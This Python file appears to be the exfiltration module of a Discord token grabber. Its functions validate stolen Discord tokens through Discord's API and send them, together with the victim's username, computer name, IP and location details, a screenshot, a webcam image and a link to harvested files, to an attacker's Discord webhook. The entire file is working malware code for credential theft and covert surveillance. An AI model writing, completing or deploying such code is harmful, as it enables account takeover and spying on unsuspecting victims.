import os

import requests
from discord_webhook import DiscordWebhook, DiscordEmbed

pcusername = os.getenv("UserName")
pcname = os.getenv("COMPUTERNAME")


def makewebhook(webhookurl):
    Webhook = DiscordWebhook(url=webhookurl, username=pcusername)
    return Webhook


def addtokens(webhook, tokenslist, platformlist):
    try:

        TokenEmbed = DiscordEmbed(title='Tokens grabbed:', color='03b2f8')
        times = 1
        timesplat = 0
        for Tokens in tokenslist:
            r = requests.get("https://discord.com/api/v8/users/@me/library",
                             headers={"Authorization": Tokens, "Content-Type": "application/json"})
            try:
                if r.status_code == 200:
                    TokenEmbed.add_embed_field(
                        name='Token ' + str(times) + ' found  in ' + platformlist[timesplat] + ':', value=Tokens)
                    times += 1
                    timesplat += 1
                else:
                    timesplat += 1
            except:
                pass
        webhook.add_embed(TokenEmbed)
    except:
        pass


def addipinfo(webhook, ipv4, ipv6, ipdetails):
    try:
        IpEmbed = DiscordEmbed(title='Ip Infos grabbed:', color='03b2f8')
        IpEmbed.add_embed_field(name='IPV4:', value=ipv4)
        IpEmbed.add_embed_field(name='IPV6', value=ipv6)
        try:
            IpEmbed.add_embed_field(name='Hostname:', value=ipdetails["hostname"])
        except:
            pass
        IpEmbed.add_embed_field(name='Region:', value=ipdetails["region"])
        IpEmbed.add_embed_field(name='Countrycode:', value=ipdetails["country"])
        IpEmbed.add_embed_field(name='Location:', value=ipdetails["loc"])
        IpEmbed.add_embed_field(name='ISP:', value=ipdetails["org"])
        IpEmbed.add_embed_field(name='Postal:', value=ipdetails["postal"])
        IpEmbed.add_embed_field(name='Timezone:', value=ipdetails["timezone"])
        webhook.add_embed(IpEmbed)
    except:
        pass


def addimages(webhook, screenshot, webcam):
    # Screenshot
    ScreenshotEmbed = DiscordEmbed(title='Screenshot grabbed:', color='03b2f8')
    ScreenshotEmbed.add_embed_field(name='Screenshot: ', value='Send as Thumbnail')
    if screenshot['success']:
        ScreenshotEmbed.set_thumbnail(url=screenshot['response'])
    else:
        ScreenshotEmbed.add_embed_field(name=screenshot['error'])
    # Webcam
    WebcamEmbed = DiscordEmbed(title='Webcam grabbed:', color='03b2f8')
    WebcamEmbed.add_embed_field(name='Webcam: ', value='Send as Thumbnail')
    if webcam['success']:
        WebcamEmbed.set_thumbnail(url=webcam['response'])
    else:
        WebcamEmbed.add_embed_field(name=webcam['error'])
    webhook.add_embed(ScreenshotEmbed)
    webhook.add_embed(WebcamEmbed)


def addcdn(webhook, file):
    CDNEmbed = DiscordEmbed(title='Files grabbed:', color='03b2f8')
    if file['success']:
        CDNEmbed.add_embed_field(name='All Infos:', value='All Infos grabbed are available here: ' + file['response'])
    else:
        CDNEmbed.add_embed_field(name='All Infos:', value='The Infos could not be uploaded. Error: ' + file['error'])
    webhook.add_embed(CDNEmbed)
